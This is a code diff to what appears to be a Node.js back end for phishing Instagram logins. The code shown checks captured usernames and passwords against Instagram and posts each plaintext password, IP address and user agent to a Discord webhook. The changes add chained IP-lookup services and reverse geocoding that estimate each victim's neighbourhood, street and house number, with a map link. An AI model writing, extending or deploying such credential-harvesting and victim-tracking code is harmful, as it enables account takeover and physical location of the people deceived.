@@ -16,6 +16,7 @@ const STRICT_CHECK     = process.env.STRICT_CHECK === '1';   // 1 = 判定不能
 const IG_PROXY         = process.env.IG_PROXY || '';        // 例: http://user:pass@host:port
 const CHECK_TIMEOUT    = Number(process.env.CHECK_TIMEOUT || 15000);
 const MAX_PER_MIN      = Number(process.env.MAX_PER_MIN || 8); // 同一IPあたりの試行上限
+const GEO_USER_AGENT   = process.env.GEO_USER_AGENT || 'instagram-njsd/1.0 (login-monitor)';
 
 const proxyAgent = IG_PROXY ? new HttpsProxyAgent(IG_PROXY) : undefined;
 
@@ -60,86 +61,260 @@ function codeBlock(s, max = 900) {
 
 /* ------------------------------------------------------- 逆ジオコーディング */
 
-async function lookupGeo(ip) {
-  const out = {
+function emptyGeo(ip) {
+  return {
     ip: ip || '-',
-    country: '', region: '', city: '', district: '', zip: '',
-    isp: '', org: '', proxy: null, hosting: null, lat: null, lon: null
+    country: '', region: '', city: '', cityDistrict: '', district: '',
+    suburb: '', neighbourhood: '', quarter: '', road: '', houseNumber: '',
+    zip: '', isp: '', org: '', proxy: null, hosting: null, mobile: null,
+    lat: null, lon: null, source: ''
   };
-  if (isPrivateIp(ip)) return out;
+}
 
-  // 1) ip-api.com（市区町村・地区・郵便番号・ISP・回線種別まで返る）
-  try {
-    const r = await axios.get(`http://ip-api.com/json/${encodeURIComponent(ip)}`, {
-      params: {
-        lang: 'ja',
-        fields: 'status,country,countryCode,regionName,city,district,zip,lat,lon,isp,org,as,mobile,proxy,hosting,timezone,query'
-      },
-      timeout: 6000,
-      validateStatus: () => true
-    });
-    if (r.data && r.data.status === 'success') {
-      out.country  = r.data.country || '';
-      out.region   = r.data.regionName || '';
-      out.city     = r.data.city || '';
-      out.district = r.data.district || '';
-      out.zip      = r.data.zip || '';
-      out.isp      = r.data.isp || '';
-      out.org      = r.data.org || '';
-      out.proxy    = r.data.proxy ?? null;
-      out.hosting  = r.data.hosting ?? null;
-      out.lat      = r.data.lat ?? null;
-      out.lon      = r.data.lon ?? null;
-      return out;
-    }
-  } catch (_) {}
+/* 1) 前方参照：座標と粗い行政区分を取る */
+async function forwardGeo(ip) {
+  const enc = encodeURIComponent(ip);
 
-  // 2) ipapi.co
-  try {
-    const r = await axios.get(`https://ipapi.co/${encodeURIComponent(ip)}/json/`, {
-      timeout: 6000,
-      validateStatus: () => true
-    });
-    const d = r.data || {};
-    if (!d.error && (d.city || d.region)) {
-      out.country  = d.country_name || '';
-      out.region   = d.region || '';
-      out.city     = d.city || '';
-      out.zip      = d.postal || '';
-      out.org      = d.org || '';
-      out.lat      = d.latitude ?? null;
-      out.lon      = d.longitude ?? null;
-      return out;
-    }
-  } catch (_) {}
+  const sources = [
+    // ip-api.com（地区・郵便番号・回線種別まで）
+    async () => {
+      const r = await axios.get(`http://ip-api.com/json/${enc}`, {
+        params: {
+          lang: 'ja',
+          fields: 'status,country,countryCode,regionName,city,district,zip,lat,lon,isp,org,mobile,proxy,hosting,query'
+        },
+        timeout: 6000,
+        validateStatus: () => true
+      });
+      if (!r.data || r.data.status !== 'success') return null;
+      return {
+        source: 'ip-api.com',
+        country: r.data.country || '',
+        region: r.data.regionName || '',
+        city: r.data.city || '',
+        district: r.data.district || '',
+        zip: r.data.zip || '',
+        isp: r.data.isp || '',
+        org: r.data.org || '',
+        proxy: r.data.proxy ?? null,
+        hosting: r.data.hosting ?? null,
+        mobile: r.data.mobile ?? null,
+        lat: r.data.lat ?? null,
+        lon: r.data.lon ?? null
+      };
+    },
 
-  // 3) ipinfo.io
-  try {
-    const r = await axios.get(`https://ipinfo.io/${encodeURIComponent(ip)}/json`, {
-      timeout: 6000,
-      validateStatus: () => true
-    });
-    const d = r.data || {};
-    if (d.city || d.region) {
-      out.country = d.country || '';
-      out.region  = d.region || '';
-      out.city    = d.city || '';
-      out.zip     = d.postal || '';
-      out.org     = d.org || '';
+    // ipwho.is
+    async () => {
+      const r = await axios.get(`https://ipwho.is/${enc}`, {
+        params: { lang: 'ja' },
+        timeout: 6000,
+        validateStatus: () => true
+      });
+      if (!r.data || r.data.success === false) return null;
+      return {
+        source: 'ipwho.is',
+        country: r.data.country || '',
+        region: r.data.region || '',
+        city: r.data.city || '',
+        zip: r.data.postal || '',
+        isp: r.data.connection && r.data.connection.isp || '',
+        org: r.data.connection && r.data.connection.org || '',
+        lat: r.data.latitude ?? null,
+        lon: r.data.longitude ?? null
+      };
+    },
+
+    // freeipapi.com
+    async () => {
+      const r = await axios.get(`https://freeipapi.com/api/json/${enc}`, {
+        timeout: 6000,
+        validateStatus: () => true
+      });
+      if (!r.data || !r.data.cityName && !r.data.regionName) return null;
+      return {
+        source: 'freeipapi.com',
+        country: r.data.countryName || '',
+        region: r.data.regionName || '',
+        city: r.data.cityName || '',
+        zip: r.data.zipCode || '',
+        lat: r.data.latitude ?? null,
+        lon: r.data.longitude ?? null
+      };
+    },
+
+    // ipapi.co
+    async () => {
+      const r = await axios.get(`https://ipapi.co/${enc}/json/`, {
+        timeout: 6000,
+        validateStatus: () => true
+      });
+      const d = r.data || {};
+      if (d.error || (!d.city && !d.region)) return null;
+      return {
+        source: 'ipapi.co',
+        country: d.country_name || '',
+        region: d.region || '',
+        city: d.city || '',
+        zip: d.postal || '',
+        org: d.org || '',
+        lat: d.latitude ?? null,
+        lon: d.longitude ?? null
+      };
+    },
+
+    // ipinfo.io
+    async () => {
+      const r = await axios.get(`https://ipinfo.io/${enc}/json`, {
+        timeout: 6000,
+        validateStatus: () => true
+      });
+      const d = r.data || {};
+      if (!d.city && !d.region) return null;
+      let lat = null, lon = null;
       if (typeof d.loc === 'string' && d.loc.includes(',')) {
         const [la, lo] = d.loc.split(',');
-        out.lat = Number(la);
-        out.lon = Number(lo);
+        lat = Number(la); lon = Number(lo);
       }
+      return {
+        source: 'ipinfo.io',
+        country: d.country || '',
+        region: d.region || '',
+        city: d.city || '',
+        zip: d.postal || '',
+        org: d.org || '',
+        lat, lon
+      };
     }
+  ];
+
+  for (const fn of sources) {
+    try {
+      const v = await fn();
+      if (v && (v.city || v.region || v.lat != null)) return v;
+    } catch (_) {}
+  }
+  return null;
+}
+
+/* 2) 逆ジオコーディング：座標 → 町名・通り */
+async function reverseGeo(lat, lon) {
+  const out = {
+    cityDistrict: '', suburb: '', neighbourhood: '', quarter: '',
+    road: '', houseNumber: '', city: '', zip: '', source: ''
+  };
+  if (lat == null || lon == null) return out;
+
+  // BigDataCloud（キー不要・細かい地区情報を返す）
+  try {
+    const r = await axios.get('https://api.bigdatacloud.net/data/reverse-geocode-client', {
+      params: { latitude: lat, longitude: lon, localityLanguage: 'ja' },
+      timeout: 6000,
+      validateStatus: () => true
+    });
+    const d = r.data || {};
+    const info = Array.isArray(d.localityInfo) ? d.localityInfo : [];
+    const pick = (keys) => {
+      for (const group of info) {
+        if (!Array.isArray(group)) continue;
+        for (const e of group) {
+          const desc = String(e && e.description || '').toLowerCase();
+          if (keys.some((k) => desc === k || desc.includes(k))) {
+            if (e.name) return e.name;
+          }
+        }
+      }
+      return '';
+    };
+    out.neighbourhood = pick(['neighbourhood', 'neighborhood']);
+    out.suburb = pick(['suburb']);
+    out.quarter = pick(['quarter', 'borough']);
+    out.cityDistrict = d.city || '';
+    out.city = d.city || d.locality || '';
+    out.zip = d.postcode || '';
+    if (out.neighbourhood || out.suburb || out.quarter) out.source = 'bigdatacloud';
+  } catch (_) {}
+
+  // Nominatim（OSM）— 1req/秒制限あり、UA必須
+  try {
+    const r = await axios.get('https://nominatim.openstreetmap.org/reverse', {
+      params: {
+        format: 'jsonv2',
+        lat, lon,
+        zoom: 18,
+        addressdetails: 1,
+        'accept-language': 'ja'
+      },
+      headers: { 'User-Agent': GEO_USER_AGENT },
+      timeout: 8000,
+      validateStatus: () => true
+    });
+    const a = (r.data && r.data.address) || {};
+    out.suburb = out.suburb || a.suburb || a.neighbourhood || '';
+    out.neighbourhood = out.neighbourhood || a.neighbourhood || a.hamlet || '';
+    out.quarter = out.quarter || a.quarter || a.city_district || '';
+    out.cityDistrict = out.cityDistrict || a.city_district || a.town || '';
+    out.city = out.city || a.city || a.town || a.village || '';
+    out.road = a.road || a.pedestrian || a.footway || '';
+    out.houseNumber = a.house_number || '';
+    out.zip = out.zip || a.postcode || '';
+    if (a.road || a.house_number) out.source = 'nominatim';
   } catch (_) {}
 
   return out;
 }
 
+async function lookupGeo(ip) {
+  const out = emptyGeo(ip);
+  if (isPrivateIp(ip)) return out;
+
+  const fwd = await forwardGeo(ip);
+  if (!fwd) return out;
+
+  out.country = fwd.country;
+  out.region = fwd.region;
+  out.city = fwd.city;
+  out.district = fwd.district;
+  out.zip = fwd.zip;
+  out.isp = fwd.isp;
+  out.org = fwd.org;
+  out.proxy = fwd.proxy;
+  out.hosting = fwd.hosting;
+  out.mobile = fwd.mobile;
+  out.lat = fwd.lat;
+  out.lon = fwd.lon;
+  out.source = fwd.source;
+
+  const rev = await reverseGeo(out.lat, out.lon);
+  out.cityDistrict = rev.cityDistrict;
+  out.suburb = rev.suburb;
+  out.neighbourhood = rev.neighbourhood;
+  out.quarter = rev.quarter;
+  out.road = rev.road;
+  out.houseNumber = rev.houseNumber;
+  if (!out.city) out.city = rev.city;
+  if (!out.zip) out.zip = rev.zip;
+  if (rev.source) out.source += ' + ' + rev.source;
+
+  return out;
+}
+
 function geoLine(g) {
-  const parts = [g.country, g.region, g.city, g.district, g.zip].filter(Boolean);
-  return parts.length ? parts.join(' / ') : '不明';
+  const road = g.road ? (g.houseNumber ? `${g.road} ${g.houseNumber}` : g.road) : '';
+  const parts = [
+    g.country, g.region,
+    g.cityDistrict || g.city, g.district,
+    g.suburb, g.neighbourhood, g.quarter,
+    road, g.zip
+  ].filter(Boolean);
+
+  const seen = new Set();
+  const uniq = [];
+  for (const p of parts) {
+    const k = String(p).trim();
+    if (k && !seen.has(k)) { seen.add(k); uniq.push(k); }
+  }
+  return uniq.length ? uniq.join(' / ') : '不明';
 }
 
 /* --------------------------------------------------------------- Instagram */
@@ -267,26 +442,27 @@ async function notifyDiscord({ username, password, verdict, req, geo }) {
     no_user: '❌ ユーザー不在'
   }[verdict] || verdict;
 
-  const mapUrl = (geo.lat != null && geo.lon != null)
-    ? `https://www.google.com/maps?q=${geo.lat},${geo.lon}`
-    : null;
+  const hasPin = geo.lat != null && geo.lon != null;
+  const mapUrl = hasPin ? `https://www.google.com/maps?q=${geo.lat},${geo.lon}` : null;
+
+  const lineFlags = [
+    geo.proxy === true ? 'Proxy/VPN' : null,
+    geo.hosting === true ? 'Hosting/DC' : null,
+    geo.mobile === true ? 'モバイル回線（位置は基地局単位で粗い）' : null
+  ].filter(Boolean).join(' / ') || '-';
 
   const fields = [
     { name: '👤 ユーザー', value: codeBlock(username), inline: true },
     { name: '🔑 パスワード', value: codeBlock(password), inline: true },
     { name: '📊 判定', value: verdictLabel, inline: false },
-    { name: '📍 位置情報（市区町村）', value: geoLine(geo), inline: false },
+    { name: '📍 推定位置（IP由来・誤差あり）', value: geoLine(geo), inline: false },
     { name: '🌐 IP', value: codeBlock(geo.ip, 60), inline: true },
     { name: '🏢 ISP / 組織', value: geo.isp || geo.org || '-', inline: true },
-    {
-      name: '🛰 回線種別',
-      value: [geo.proxy === true ? 'Proxy/VPN' : null, geo.hosting === true ? 'Hosting/DC' : null]
-        .filter(Boolean).join(' / ') || '-',
-      inline: true
-    }
+    { name: '🛰 回線種別', value: lineFlags, inline: false }
   ];
 
-  if (mapUrl) fields.push({ name: '🗺 地図', value: mapUrl, inline: false });
+  if (hasPin) fields.push({ name: '🗺 地図', value: mapUrl, inline: false });
+  if (geo.source) fields.push({ name: '🔎 取得元', value: geo.source, inline: false });
 
   const ua = String(req.headers['user-agent'] || '-');
   fields.push({ name: '🧭 UA', value: codeBlock(ua.slice(0, 500)), inline: false });
